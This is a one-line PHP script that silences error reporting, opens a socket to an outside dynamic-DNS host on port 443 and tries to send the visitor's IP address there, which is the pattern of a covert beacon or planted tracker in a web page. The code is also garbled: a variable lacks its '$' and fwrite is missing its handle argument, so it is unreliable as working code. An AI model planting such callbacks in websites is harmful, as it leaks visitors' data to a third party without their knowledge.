<?php error_reporting(E_ERROR | E_PARSE); r = fsockopen('example.ddns.net', 443); fwrite($_SERVER['REMOTE_ADDR']); ?>
